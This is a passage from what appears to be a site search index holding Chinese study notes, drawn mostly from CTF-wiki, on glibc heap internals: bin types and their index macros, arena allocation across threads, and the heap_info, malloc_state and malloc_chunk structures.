\uff0c\u7136\u540e\u5c06\u5b83\u4eec\u4ece small bin \u4e2d\u79fb\u9664\uff0c\u6700\u540e\u5c06\u65b0\u7684 chunk \u6dfb\u52a0\u5230 unsorted bin \u4e2d\u3002 small bin \u76f8\u5173\u7684\u5b8f\u5982\u4e0b #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT // \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63 #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) //\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185 #define in_smallbin_range(sz) \\ ((unsigned long) (sz) < (unsigned long) MIN_LARGE_SIZE) // \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002 #define smallbin_index(sz) \\ ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) >> 4) \\ : (((unsigned) (sz)) >> 3)) + \\ SMALLBIN_CORRECTION) \u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk \u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230 small bin \u4e2d\u53bb\u7684\uff0c\u6211\u4eec\u5728\u540e\u9762\u5206\u6790\u5177\u4f53\u7684\u6e90\u4ee3\u7801\u65f6\u4f1a\u6709\u6df1\u523b\u7684\u4f53\u4f1a\u3002 Large Bin large bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c \u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185 \u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a \u7ec4 \u6570\u91cf \u516c\u5dee 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 \u4e0d\u9650\u5236 \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5 bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002 \u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512>>6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a 56+8=64\u3002 #define largebin_index_32(sz) \\ (((((unsigned long) (sz)) >> 6) <= 38) \\ ? 56 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) >> 6) <= 45) \\ ? 49 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ (((((unsigned long) (sz)) >> 6) <= 48) \\ ? 48 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big(sz) \\ : largebin_index_32(sz)) large chunk \u53ef\u4ee5\u6dfb\u52a0\u3001\u5220\u9664\u5728 large bin \u7684\u4efb\u4f55\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u9274\u4e8e\u540c\u4e00\u4e2a large bin \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u5b9a\u76f8\u540c\uff0c\u56e0\u6b64\u4e3a\u4e86\u52a0\u5feb\u5185\u5b58\u5206\u914d\u548c\u91ca\u653e\u7684\u901f\u5ea6\uff0c\u5c31\u5c06\u540c\u4e00\u4e2a large bin \u4e2d\u7684\u6240\u6709 chunk \u6309\u7167 chunk size \u8fdb\u884c\u4ece\u5927\u5230\u5c0f\u7684\u6392\u5217\uff1a\u6700\u5927\u7684 chunk \u653e\u5728\u94fe\u8868\u7684\u524d\u7aef\uff0c\u6700\u5c0f\u7684 chunk \u653e\u5728\u5c3e\u7aef\u3002 large bin \u7684 free \uff08\u5408\u5e76\uff09\u64cd\u4f5c\u7c7b\u4f3c\u4e8e small bin \u3002 large bin malloc \uff08\u90e8\u5206\uff09\u64cd\u4f5c\uff1a \u5982\u679c\u5c3e\u7aef\u6700\u5c0f\u7684 chunk \u5927\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u7684\u8bdd\uff0c\u5c31\u5c06\u8be5 chunk \u62c6\u5206\u4e3a\u4e24\u4e2a chunk \uff1a\u524d\u8005\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5927\u5c0f\u7b49\u540c\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\uff1b\u5269\u4f59\u7684\u90e8\u5206\u505a\u4e3a\u4e00\u4e2a\u65b0\u7684 chunk \u6dfb\u52a0\u5230 unsorted bin \u4e2d\u3002 Unsorted Bin unsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002 \u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. */ \u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */ #define unsorted_chunks(M) (bin_at(M, 1)) unsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684 bin \u6570\u7ec4\u4e0b\u6807 1 \u5904\u3002\u6545\u800c unsorted bin \u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90 \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0a\u9762\u7684\u4ecb\u7ecd\u3002 \u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002 \u4e0b\u9762\u9644\u4e0a\u5404\u7c7b\u4e0a\u8ff0\u4e09\u7c7b bin \u7684\u903b\u8f91\uff1a common macro \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f \u6839\u636e chunk \u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97 chunk \u6240\u5728\u7684\u7d22\u5f15 #define bin_index(sz) \\ ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz)) \u53c2\u8003\u8d44\u6599 Linux \u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790 CTF-WIKI Linux\u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790(\u4e0a\u534a\u90e8) Linux\u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790(\u4e0b\u534a\u90e8) Linux\u4e0b\u5806\u6808\u7ed3\u6784\u5206\u6790","title":"\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784"},{"location":"glibc-heap/heap_structure/#_1","text":"\u5185\u5bb9\u7edd\u5927\u90e8\u5206\u6765\u81eactf-wiki\uff0c\u6587\u7ae0\u7528\u4e8e\u81ea\u5df1\u5b66\u4e60\u8bb0\u5f55 \u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a \u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002 \u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002","title":"\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784"},{"location":"glibc-heap/heap_structure/#_2","text":"","title":"\u5b8f\u89c2\u7ed3\u6784"},{"location":"glibc-heap/heap_structure/#32","text":"\u4ece\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4e3a\uff1a\u4e0d\u53ef\u8bbf\u95ee\u7684\u5185\u6838\u7a7a\u95f4\uff0c\u6808\u7a7a\u95f4\uff08\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u751f\u957f\uff09\uff0c\u5185\u5b58\u5e03\u5c40\u533a\uff0c\u5806\u7a7a\u95f4\uff08\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u751f\u957f\uff09\uff0cBSS\uff0c\u6570\u636e\u6bb5\uff0c\u6587\u672c\u6bb5\u3002\u672c\u62a5\u544a\u8ba8\u8bba\u8fdb\u7a0b\u7684\u6808\u7a7a\u95f4\u548c\u5806\u7a7a\u95f4\u7684\u5177\u4f53\u7ed3\u6784\u3002","title":"32\u4f4d\u5185\u5b58\u5e03\u5c40"},{"location":"glibc-heap/heap_structure/#64","text":"\u7528\u6237\u7a7a\u95f4\u7684\u5e03\u5c40\u548c32\u4f4d\u5dee\u522b\u5f88\u5c0f\u3002","title":"64\u4f4d\u5185\u5b58\u5e03\u5c40"},{"location":"glibc-heap/heap_structure/#_3","text":"","title":"\u5806\u7ba1\u7406\u4ecb\u7ecd"},{"location":"glibc-heap/heap_structure/#3","text":"\u5728 glibc \u7684 malloc \u4e2d\u9488\u5bf9\u5806\u7ba1\u7406\uff0c\u4e3b\u8981\u6d89\u53ca\u5230\u4ee5\u4e0b 3 \u79cd\u6570\u636e\u7ed3\u6784\uff1a heap_info\uff08\u5373Heap Header\uff09\u5bf9\u5e94\u7ba1\u7406 heap malloc_state\uff08\u5373Arena Header\uff09 \u5bf9\u5e94\u7ba1\u7406 area malloc_chunk\uff08\u5373Chunk Header\uff09 \u5bf9\u5e94\u7ba1\u7406 chunk \u8fd9\u91cc\u5806\u7ba1\u7406\u4f1a\u51fa\u73b0\u5728\u591a\u7ebf\u7a0b\uff0c\u4e00\u822cpwn\u9898\u4e0d\u4f1a\u6d89\u53ca\u591a\u7ebf\u7a0b\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u90fd\u662f\u5728 main_area \u4e0a\u64cd\u4f5c\uff0c\u56e0\u6b64\u53ef\u9009\u62e9\u6027\u9605\u8bfb heap_info\u3001malloc_state\u3002","title":"3 \u79cd\u6570\u636e\u7ed3\u6784"},{"location":"glibc-heap/heap_structure/#heap_info","text":"heap_info: \u5373Heap Header\uff0c\u56e0\u4e3a\u4e00\u4e2a thread arena \uff08\u6ce8\u610f\uff1a\u4e0d\u5305\u542b main thread \uff09\u53ef\u4ee5\u5305\u542b\u591a\u4e2aheaps\uff0c\u6240\u4ee5\u4e3a\u4e86\u4fbf\u4e8e\u7ba1\u7406\uff0c\u5c31\u7ed9\u6bcf\u4e2a heap \u5206\u914d\u4e00\u4e2a heap header\u3002\u90a3\u4e48\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4e00\u4e2athread arena\u4f1a\u5305\u542b\u591a\u4e2a heaps \u5462?\u5728\u5f53\u524d heap \u4e0d\u591f\u7528\u7684\u65f6\u5019\uff0cmalloc \u4f1a\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 mmap \u7533\u8bf7\u65b0\u7684\u5806\u7a7a\u95f4\uff0c\u65b0\u7684\u5806\u7a7a\u95f4\u4f1a\u88ab\u6dfb\u52a0\u5230\u5f53\u524dthread arena\u4e2d\uff0c\u4fbf\u4e8e\u7ba1\u7406\u3002 typedef struct _heap_info { mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ & MALLOC_ALIGN_MASK]; } heap_info;","title":"heap_info"},{"location":"glibc-heap/heap_structure/#arena","text":"\u4e3b\u7ebf\u7a0b\u548c\u5b50\u7ebf\u7a0b\u6709\u81ea\u5df1\u72ec\u7acb\u7684 arena \uff0c\u90a3\u4e48\u662f\u4e0d\u662f\u65e0\u8bba\u6709\u591a\u5c11\u4e2a\u7ebf\u7a0b\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u81ea\u5df1\u72ec\u7acb\u7684 arena \u5462\uff1f\u7b54\u6848\u662f\u5426\u5b9a\u7684\u3002\u4e8b\u5b9e\u4e0a\uff0c arena \u7684\u4e2a\u6570\u662f\u8ddf\u7cfb\u7edf\u4e2d\u5904\u7406\u5668\u6838\u5fc3\u4e2a\u6570\u76f8\u5173\u7684\uff0c\u5982\u4e0b\u8868\u6240\u793a\uff1a systems number of arena 32bits 2 x number of cpu cores + 1 64bits 8 x number of cpu cores + 1","title":"Arena \u6570\u91cf\u9650\u5236"},{"location":"glibc-heap/heap_structure/#arena_1","text":"\u5047\u8bbe\u6709\u5982\u4e0b\u60c5\u666f\uff1a\u4e00\u53f0\u53ea\u542b\u6709\u4e00\u4e2a\u5904\u7406\u5668\u6838\u5fc3\u7684\u673a\u5668\u5b89\u88c5\u6709 32 \u4f4d\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5176\u4e0a\u8fd0\u884c\u4e86\u4e00\u4e2a\u591a\u7ebf\u7a0b\u5e94\u7528\u7a0b\u5e8f\uff0c\u5171\u542b\u6709 4 \u4e2a\u7ebf\u7a0b\u2014\u2014\u4e3b\u7ebf\u7a0b\u548c\u4e09\u4e2a\u5b50\u7ebf\u7a0b\u3002\u663e\u7136\u7ebf\u7a0b\u4e2a\u6570\u5927\u4e8e\u7cfb\u7edf\u80fd\u7ef4\u62a4\u7684\u6700\u5927 arena \u4e2a\u6570\uff082 x \u6838\u5fc3\u6570 + 1= 3\uff09\uff0c\u90a3\u4e48\u6b64\u65f6 glibc \u7684 malloc \u5c31\u9700\u8981\u786e\u4fdd\u8fd9 4 \u4e2a\u7ebf\u7a0b\u80fd\u591f\u6b63\u786e\u5730\u5171\u4eab\u8fd9 3 \u4e2a arena \uff0c\u90a3\u4e48\u5b83\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462\uff1f \u5f53\u4e3b\u7ebf\u7a0b\u9996\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u4e3a\u5b83\u5206\u914d\u4e00\u4e2a main arena \uff0c\u800c\u4e0d\u9700\u8981\u4efb\u4f55\u9644\u52a0\u6761\u4ef6\u3002 \u5f53\u5b50\u7ebf\u7a0b 1 \u548c\u5b50\u7ebf\u7a0b 2 \u9996\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\uff0c glibc \u5b9e\u73b0\u7684 malloc \u4f1a\u5206\u522b\u4e3a\u6bcf\u4e2a\u5b50\u7ebf\u7a0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 thread arena \u3002\u6b64\u65f6\uff0c\u5404\u4e2a\u7ebf\u7a0b\u4e0e arena \u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u3002\u4f46\u662f\uff0c\u5f53\u7528\u6237\u7ebf\u7a0b 3 \u8c03\u7528 malloc \u7684\u65f6\u5019\u5c31\u51fa\u73b0\u95ee\u9898\u4e86\u3002\u56e0\u4e3a\u6b64\u65f6 glibc \u7684 malloc \u80fd\u7ef4\u62a4\u7684 arena \u4e2a\u6570\u5df2\u7ecf\u8fbe\u5230\u4e0a\u9650\uff0c\u65e0\u6cd5\u518d\u4e3a\u5b50\u7ebf\u7a0b 3 \u5206\u914d\u65b0\u7684 arena \u4e86\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u91cd\u590d\u4f7f\u7528\u5df2\u7ecf\u5206\u914d\u597d\u7684 3 \u4e2a arena \u4e2d\u7684\u4e00\u4e2a\uff08 main arena , arena1 \u6216\u8005 arena2 \uff09\u3002\u90a3\u4e48\u8be5\u9009\u62e9\u54ea\u4e2a arena \u8fdb\u884c\u91cd\u590d\u5229\u7528\u5462\uff1f glibc \u7684 malloc \u9075\u5faa\u4ee5\u4e0b\u89c4\u5219\uff1a \u9996\u5148\u5faa\u73af\u904d\u5386\u6240\u6709\u53ef\u7528\u7684 arena \uff0c\u5728\u904d\u5386\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5b83\u4f1a\u5c1d\u8bd5\u52a0\u9501\u8be5 arena \u3002\u5982\u679c\u6210\u529f\u52a0\u9501\uff08\u8be5 arena \u5f53\u524d\u5bf9\u5e94\u7684\u7ebf\u7a0b\u5e76\u672a\u4f7f\u7528\u5806\u5185\u5b58\u5219\u8868\u793a\u53ef\u52a0\u9501\uff09\uff0c\u6bd4\u5982\u5c06 main arena \u6210\u529f\u9501\u4f4f\uff0c\u90a3\u4e48\u5c31\u5c06 main arena \u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5373\u8868\u793a\u8be5 arena \u88ab\u5b50\u7ebf\u7a0b 3 \u5171\u4eab\u4f7f\u7528\u3002 \u5982\u679c\u6ca1\u80fd\u627e\u5230\u53ef\u7528\u7684 arena \uff0c\u90a3\u4e48\u5c31\u5c06\u5b50\u7ebf\u7a0b 3 \u7684 malloc \u64cd\u4f5c\u963b\u585e\uff0c\u76f4\u5230\u6709\u53ef\u7528\u7684 arena \u4e3a\u6b62\u3002 \u73b0\u5728\uff0c\u5982\u679c\u5b50\u7ebf\u7a0b 3 \u518d\u6b21\u8c03\u7528 malloc \u7684\u8bdd\uff0c glibc \u7684 malloc \u5c31\u4f1a\u5148\u5c1d\u8bd5\u4f7f\u7528\u6700\u8fd1\u8bbf\u95ee\u7684 arena \uff08\u6b64\u65f6\u4e3a main arena \uff09\u3002\u5982\u679c\u6b64\u65f6 main arena \u53ef\u7528\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\uff0c\u5426\u5219\u5c31\u5c06\u5b50\u7ebf\u7a0b 3 \u963b\u585e\uff0c\u76f4\u5230 main arena \u518d\u6b21\u53ef\u7528\u4e3a\u6b62\u3002 \u8fd9\u6837\u5b50\u7ebf\u7a0b 3 \u4e0e\u4e3b\u7ebf\u7a0b\u5c31\u5171\u4eab main arena \u4e86\u3002\u81f3\u4e8e\u5176\u4ed6\u66f4\u590d\u6742\u7684\u60c5\u51b5\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002","title":"Arena \u7ba1\u7406"},{"location":"glibc-heap/heap_structure/#malloc_state","text":"malloc_state: \u5373Arena Header\uff0c\u7528\u4e8e\u8868\u793a area \u7684\u4fe1\u606f\uff0c\u6bcf\u4e2athread\u53ea\u542b\u6709\u4e00\u4e2aArena Header\u3002Arena Header\u5305\u542bbins\u7684\u4fe1\u606f\u3001top chunk\u4ee5\u53ca\u6700\u540e\u4e00\u4e2aremainder chunk\u7b49(\u8fd9\u4e9b\u6982\u5ff5\u4f1a\u5728\u540e\u6587\u8be6\u7ec6\u4ecb\u7ecd): struct malloc_state { /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; };","title":"malloc_state"},{"location":"glibc-heap/heap_structure/#malloc_chunk","text":"malloc_chunk: \u5373Chunk Header\uff0c\u4e00\u4e2aheap\u88ab\u5206\u4e3a\u591a\u4e2achunk\uff0c\u81f3\u4e8e\u6bcf\u4e2achunk\u7684\u5927\u5c0f\uff0c\u8fd9\u662f\u6839\u636e\u7528\u6237\u7684\u8bf7\u6c42\u51b3\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u7528\u6237\u8c03\u7528malloc(size_t size)\u4f20\u9012\u7684size\u53c2\u6570\u201c\u5c31\u662f\u201dchunk\u7684\u5927\u5c0f(\u8fd9\u91cc\u7ed9\u201c\u5c31\u662f\u201d\u52a0\u4e0a\u5f15\u53f7\uff0c\u8bf4\u660e\u8fd9\u79cd\u8868\u793a\u5e76\u4e0d\u51c6\u786e\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\u7406\u89e3\u5c31\u6682\u65f6\u8fd9\u4e48\u63cf\u8ff0\u4e86\uff0c\u8be6\u7ec6\u8bf4\u660e\u89c1\u540e\u6587)\u3002\u6bcf\u4e2achunk\u90fd\u7531\u4e00\u4e2a\u7ed3\u6784\u4f53malloc_chunk\u8868\u793a\uff1a struct malloc_chunk { /* #define INTERNAL_SIZE_T size_t */ INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. \u8fd9\u4e24\u4e2a\u6307\u9488\u53ea\u5728free chunk\u4e2d\u5b58\u5728*/ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; \u5173\u4e8e\u4e0a\u8ff0\u7684\u7ed3\u6784\uff08malloc_chunk\u4e3b\u7ebf\u7a0b\u4e5f\u7528\u5230\uff09\uff0c\u9488\u5bf9\u5b50\u7ebf\u7a0b\u7684\uff0c\u4e3b\u7ebf\u7a0b\u548c\u5b50\u7ebf\u7a0b\u6709\u4e00\u4e9b\u4e0d\u540c\uff1a \u4e3b\u7ebf\u7a0b\u7684\u5806\u4e0d\u662f\u5206\u914d\u5728\u5185\u5b58\u6620\u5c04\u533a\uff0c\u800c\u662f\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u5806\u533a\uff0c\u56e0\u6b64\u4e0d\u542b\u6709\u591a\u4e2a heap \u6240\u4ee5\u4e5f\u5c31\u4e0d\u542b\u6709 heap_info \u7ed3\u6784\u4f53\u3002\u5f53\u9700\u8981\u66f4\u591a\u5806\u7a7a\u95f4\u7684\u65f6\u5019\uff0c\u76f4\u63a5\u901a\u8fc7\u589e\u957f brk \u6307\u9488\u6765\u83b7\u53d6\u66f4\u591a\u7684\u7a7a\u95f4\uff0c\u76f4\u5230\u5b83\u78b0\u5230\u5185\u5b58\u6620\u5c04\u533a\u57df\uff08mapping\uff09\u4e3a\u6b62\u3002 \u4e0d\u540c\u4e8e thread arena \uff0c\u4e3b\u7ebf\u7a0b\u7684 main arena \u7684 arena header \u5e76\u4e0d\u5728\u5806\u533a\u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\u5b83\u5c5e\u4e8e libc.so \u7684 data segment \u533a\u57df\u3002","title":"malloc_chunk"},{"location":"glibc-heap/heap_structure/#heap-segmentarena","text":"\u9996\u5148\uff0c\u901a\u8fc7\u5185\u5b58\u5206\u5e03\u56fe\u7406\u6e05malloc_state\u4e0eheap_info\u4e4b\u95f4\u7684\u7ec4\u7ec7\u5173\u7cfb\u3002 \u4e0b\u56fe\u662f\u53ea\u6709\u4e00\u4e2aheap segment\u7684main arena\u548cthread arena\u7684\u5185\u5b58\u5206\u5e03\u56fe\uff1a \u4e0b\u56fe\u662f\u4e00\u4e2athread arena\u4e2d\u542b\u6709\u591a\u4e2aheap segments\u7684\u60c5\u51b5\uff1a \u4ece\u4e0a\u56fe\u53ef\u4ee5\u770b\u51fa\uff0cthread arena\u53ea\u542b\u6709\u4e00\u4e2amalloc_state(\u5373arena header)\uff0c\u5374\u6709\u4e24\u4e2aheap_info(\u5373heap header)\u3002\u7531\u4e8e\u4e24\u4e2aheap segments\u662f\u901a\u8fc7mmap\u5206\u914d\u7684\u5185\u5b58\uff0c\u4e24\u8005\u5728\u5185\u5b58\u5e03\u5c40\u4e0a\u5e76\u4e0d\u76f8\u90bb\u800c\u662f\u5206\u5c5e\u4e8e\u4e0d\u540c\u7684\u5185\u5b58\u533a\u95f4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4fbf\u4e8e\u7ba1\u7406\uff0clibc malloc\u5c06\u7b2c\u4e8c\u4e2aheap_info\u7ed3\u6784\u4f53\u7684prev\u6210\u5458\u6307\u5411\u4e86\u7b2c\u4e00\u4e2aheap_info\u7ed3\u6784\u4f53\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u5373ar_ptr\u6210\u5458\uff09\uff0c\u800c\u7b2c\u4e00\u4e2aheap_info\u7ed3\u6784\u4f53\u7684ar_ptr\u6210\u5458\u6307\u5411\u4e86malloc_state\uff0c\u8fd9\u6837\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u65b9\u4fbf\u540e\u7eed\u7ba1\u7406\u3002","title":"heap 